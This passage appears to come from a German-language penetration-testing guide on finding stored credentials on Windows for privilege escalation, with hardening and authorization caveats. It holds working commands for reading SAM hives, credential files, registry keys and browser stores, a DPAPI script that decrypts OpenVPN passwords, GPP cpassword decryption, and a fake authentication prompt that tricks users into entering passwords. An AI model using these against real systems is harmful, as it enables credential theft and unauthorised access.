Ein CI-Server kann eingereichte Quellcodeänderungen auch nach Abschluss des Builds in seinem Datenverzeichnis aufbewahren. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Remote-Run-Änderungen; das Datenverzeichnis kann konfiguriert werden und befindet sich nicht zwangsläufig unter `ProgramData`. Ein lesbarer Patch kann entfernte oder hinzugefügte Verweise auf eine Zugangsdaten-Datei, einen Verschlüsselungsschlüssel oder ein Skript enthalten, das beides verwendet. Ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` benötigt beispielsweise neben der verschlüsselten Zeichenfolge auch den AES-Schlüssel; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat übergeben wird. Prüfen Sie zunächst nur die Namen zugänglicher Patches und untersuchen Sie dann relevante Inhalte nur mit entsprechender Berechtigung, ohne Geheimnisse in routinemäßigen Enumeration-Ausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Zugangsdaten noch Zugriff mit höheren Berechtigungen. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen aufzunehmen.

### Benutzerdefinierte Rotation des lokalen Administratorpassworts

Ein selbst entwickelter Passwort-Rotator kann ein verschlüsseltes lokales Administratorpasswort in einem lokalen Dienst speichern und dessen Zugangsdaten für den Datenspeicher in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei ablegen. Prüfen Sie gemeinsam die geplante Aufgabe des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen für den Datenspeicher. Ein nur an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Zugangsdaten weiterhin erreichbar; die Authentifizierung allein beweist jedoch nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn das Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, prüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go [`math/rand`](https://pkg.go.dev/math/rand) ableitet, eignet sich nicht zum Schutz dieses Passworts; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallswerte ungeeignet ist. Vergewissern Sie sich, dass jedes wiederhergestellte Passwort aktuell ist und zu einem Konto der lokalen Administratorengruppe gehört, bevor Sie es als möglichen Weg zur Rechteausweitung betrachten. Eine geplante Aufgabe, ein `.env`-Pfad oder ein verschlüsselter Blob allein belegt keine dieser Voraussetzungen. Geben Sie Passwörter und Schlüsselmaterial nicht in routinemäßigen Enumeration-Ausgaben aus.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorpasswörter. Dessen Verzeichnis- oder Entra-gestützter Speicher und die zugehörigen Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) legen ebenfalls fest, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen darf.

### Java-Server-Plugin-Archive und Wiederverwendung von Zugangsdaten

Einige Java-Server-Plugins werden als JAR-Archive im Verzeichnis `plugins` eines Servers bereitgestellt. Ein lesbares benutzerdefiniertes Plugin kann Konfiguration oder Bytecode mit eingebetteten Dienstzugangsdaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Berechtigung und geben Sie wiederhergestellte Geheimnisse nicht in routinemäßigen Enumeration-Ausgaben aus. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist; ein wiederhergestelltes Dienstpasswort führt nur dann zu höheren Berechtigungen, wenn es auch für ein privilegierteres Konto gültig ist. Prüfen Sie die relevanten Datei-ACLs und ersetzen Sie wiederverwendete Zugangsdaten durch eindeutige Geheimnisse. Siehe die [Anleitung zur Plugin-Installation von PaperMC](https://docs.papermc.io/paper/adding-plugins/) für die Verzeichnisstruktur und die [JAR-Dokumentation von Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) für den Inhalt von Archiven.

### Zugangsdaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, prüfen Sie gemeinsam die `OFUSER`-Einträge und die Eigenschaft `passwordKey`. Laut der [Dokumentation zum User-Provider von Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter im Klartext oder mit einem in dieser Eigenschaft hinterlegten Schlüssel verschlüsselt gespeichert werden. Ein wiederhergestelltes Passwort ist für eine Rechteausweitung nur relevant, wenn es für eine privilegiertere Identität noch gültig ist; der Dateiname allein belegt weder Lesezugriff noch die Wiederverwendung von Zugangsdaten. Der Pfad ist ein Hinweis für die Bestandsaufnahme. Geben Sie Datenbankinhalte und Zugangsdaten nicht in routinemäßigen Enumeration-Ausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die gebundene Schnittstelle der Admin-Konsole offenlegen, auch wenn eine externe Datenbank verwendet wird. Openfire bindet seine Admin-Konsole üblicherweise an Loopback; ein lokales Konto kann die Adresse dennoch erreichen, sofern der Listener aktiv ist. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Admin-Rolle, die Richtlinie für Plugin-Uploads und die Identität des Openfire-Dienstes. Ein Admin, der ein Plugin installieren kann, kann dafür sorgen, dass Plugin-Code im Kontext des Dienstes ausgeführt wird. Das kann weitreichende Berechtigungen bedeuten, wenn der Dienst als LocalSystem läuft. Ein übereinstimmendes Kontopasswort oder ein lesbarer Konfigurationspfad allein beweist weder Zugriff auf die Admin-Konsole noch Codeausführung. Siehe die [Installations- und Plugin-Verwaltungsanleitung des Herstellers](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration eines forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, üblicherweise `server.config.yaml` genannt, können den `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit niedrigeren Berechtigungen diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat erstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder der Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Schlüsselmaterial; ihr Fund belegt keinen Zugriff auf die Server-CA. Bei manchen Bereitstellungen wird der private CA-Schlüssel offline aufbewahrt, sodass eine lesbare Serverkonfiguration den Signierschlüssel möglicherweise nicht enthält.

Prüfen Sie auf einem Windows-Server die ACLs der **Server**konfiguration im Installationsverzeichnis sowie alle geschützten Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwenden Sie den konfigurierten Pfad des Dienstes, falls dieser abweicht. Vergewissern Sie sich, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Enumeration-Ausgaben aus. Der `config api_client`-Workflow des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; dafür ist jedoch auch eine wirksame serverseitige Rolle erforderlich. Deren Erstellung oder Änderung kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann einen Zugangsweg bieten, auch wenn diese Schreibvorgänge nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im jeweiligen Server- oder Agentenkontext, der weitreichende Berechtigungen haben kann.

Schützen Sie die Serverkonfiguration und Sicherungen mit restriktiven ACLs, bewahren Sie den CA-Signierschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen sowie den Zugriff auf Listener. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### Putty-Zugangsdaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während eine exportierte Sitzungssicherung `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds' Exportanleitung](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; in seinem [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wird der native Speicher angegeben. Prüfe zuerst Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät weder das Passwort noch beweist es, dass gespeicherte Zugangsdaten noch gültig sind oder höhere Berechtigungen besitzen.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-Private-Keys können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht ausgeführt wird und du möchtest, dass er beim Systemstart automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH bei einem Computer anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und Procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch offline-`SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Priorisieren Sie lokal zugängliche Backup- oder Image-Verzeichnisse und prüfen Sie die **Member-Namen** eines Images, bevor Sie etwas extrahieren; ein `.wim`-Dateiname allein beweist nicht, dass Hives offengelegt werden, und übliche `install.wim`-, `boot.wim`- und Recovery-Images sind häufige Irrwege. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn diese Freigabe im Scope liegt. Siehe Microsofts [Anleitung zu Windows-Images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [Referenz zu Registry-Hive-Dateien](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Anmeldedaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Es gab zuvor eine Funktion, mit der sich über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern bereitstellen ließen. Diese Methode wies jedoch erhebliche Sicherheitslücken auf. Erstens konnten alle Domänenbenutzer auf die Group Policy Objects (GPOs) zugreifen, die als XML-Dateien in SYSVOL gespeichert waren. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein erhebliches Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien mit einem nicht leeren Feld „cpassword“ sucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und erleichtert so das Erkennen und Beheben dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec verwenden, um die Passwörter zu erhalten:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem ausgelieferten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du es als Offenlegung einstufst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne die Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass das Archiv ein Geheimnis enthält, noch, dass ein wiederhergestellter Zugang höher privilegierte Rechte gewährt.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den **Benutzer jederzeit bitten, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du glaubst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu **fragen**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen, die Zugangsdaten enthalten**

Bekannte Dateien, die vor einiger Zeit **Passwörter** im **Klartext** oder in **Base64** enthielten.

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-Datenbanken verwenden häufig die Dateiendung `.psafe3`. Behandle eine Datei mit passendem Namen als möglichen verschlüsselten Tresor. Ihr Vorhandensein belegt nicht, dass du sie lesen, entsperren oder gespeicherte Zugangsdaten verwenden kannst. Prüfe bei der Überprüfung der Speicherorte solcher Dateien zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-Datei `.kdbx` ist ebenfalls lediglich ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren benötigst du das tatsächliche Master-Passwort sowie alle konfigurierten Faktoren wie eine Schlüsseldatei oder ein Konto. Falls eine autorisierte Überprüfung ein LM:NT-Hash-Paar in einem Eintrag findet, überprüfe das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag verleiht für sich genommen keine Administrator- oder SYSTEM-Rechte; auch der Remote-Dienstzugriff, die Kontoberechtigungen und alle separaten Schritte zur Dienstausführung müssen gegeben sein. Die Inventarisierung sollte den Tresorpfad und seine Lesbarkeit angeben, nicht die Datenbank oder gespeicherte Zugangsdaten ausgeben.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Prüfe zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Eintrag und die gelöschte Datei im zugehörigen `$R`-Eintrag. Prüfe die Metadaten und ob die aktuelle Identität Leseberechtigung hat, bevor du ein Archiv öffnest. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachte den Archivnamen als Kandidaten für eine Prüfung, nicht als Beweis dafür, dass er ein gültiges Secret enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf **code-signing** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann der Schlüssel ein geändertes PowerShell-Skript signieren; [PowerShell erfordert ein Code-signing-Zertifikat mit einem privaten Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisher-Regeln werten die Identität des Signierers und den Regelbereich aus](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Die Ausführung unter einem anderen Konto erfordert, dass die aktuelle Identität das genaue Skript ändern kann, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptiert und eine geplante Aufgabe oder ein anderer Prozess mit höheren Berechtigungen es tatsächlich ausführt. Ein `.pfx`-Dateiname, ein Zertifikatsbetreff oder ein beschreibbares Skript allein belegt diese Kette nicht. Prüfe Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor du Material mit privaten Schlüsseln öffnest oder die Aufgabe auslöst.

Prüfe auch zugängliche Datenbanken von Messaging-Client-Profilen, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML oder TXT gespeichert sein, manchmal in einem benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Daten-Volume ermöglichen, das ältere Backups enthält. Prüfe das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, erfordert die Offline-Wiederherstellung von Domänenzugangsdaten auch den passenden `SYSTEM`-Hive, wie im [Workflow zu Backups und privilegierten Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänen-Backup vorhanden ist.

Um **Passwörter wiederherzustellen**, die von mehreren Programmen gespeichert wurden, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Innerhalb der Registrierung

**Weitere mögliche Registrierungsschlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfen Sie auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Im herkömmlichen **Default**-Profil des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Speicherort des Standardprofils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein einer Datei ist lediglich ein Hinweis auf einen möglichen Zugangsdaten-Speicher: Prüfen Sie, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem Benutzerkonto mit höheren Privilegien gehört. Eine reine Pfadermittlung muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und Dateien mit verschlüsselten Logins sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfen Sie, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor Sie davon ausgehen, dass die Zugangsdaten verwendbar sind. Wenn ein wiederhergestellter Zugang zu einem Domänenkonto gehört, prüfen Sie separat die effektiven Gruppensteuerungsrechte dieses Kontos sowie die [Lese- oder Entschlüsselungsrechte der Gruppe für LAPS-Passwörter](../active-directory-methodology/laps.md); Browser-Artefakte allein weisen keinen Pfad zu Administratorrechten nach.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten in verschiedenen Sprachen ermöglicht. Jede COM-Komponente wird durch eine **class ID (CLSID)** identifiziert, und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen werden in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registry finden Sie den untergeordneten Registry-Schlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-neutral) sein kann.

![Browserverlauf – COM DLL Overwriting: In den CLSIDs dieser Registry finden Sie den untergeordneten Registry-Schlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn Sie **eine der auszuführenden DLLs überschreiben** können, könnten Sie **Privilegien eskalieren**, sofern diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus einsetzen, finden Sie hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

